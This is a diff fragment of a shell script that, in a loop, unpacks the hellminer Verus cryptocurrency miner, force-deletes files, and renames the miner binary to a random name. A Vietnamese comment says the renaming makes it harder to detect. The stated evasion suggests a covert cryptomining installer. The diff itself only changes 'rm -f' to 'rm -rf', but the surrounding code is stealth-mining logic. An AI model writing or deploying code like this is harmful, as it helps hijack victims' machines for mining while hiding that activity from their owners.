@@ -13,8 +13,8 @@ while true; do
   # Giải nén file
   tar -xf hellminer_linux64_avx2.tar.gz
   rm -f hellminer_linux64_avx2.tar.gz
-  rm -f run_verus.sh
-  rm -f verus_solver
+  rm -rf run_verus.sh
+  rm -rf verus_solver
   # Đổi tên file để khó phát hiện hơn
   random_name=$(generate_random_name)
   mv hellminer "$random_name"
